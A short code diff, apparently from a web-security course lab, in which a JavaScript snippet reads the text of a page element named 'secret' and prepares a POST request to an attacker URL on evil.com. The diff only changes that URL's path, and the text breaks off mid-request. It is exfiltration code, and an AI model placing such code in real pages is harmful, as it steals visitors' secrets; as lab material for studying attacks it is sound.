@@ -1,6 +1,6 @@
 const secret = document.getElementById("secret").innerText;
 
-const urlAttackerSever = "http://evil.com:8080/mycode/tp3/get_secret.php";
+const urlAttackerSever = "http://evil.com:8080/tp3/mycode/get_secret.php";
 
 const request = {
     method: "POST",
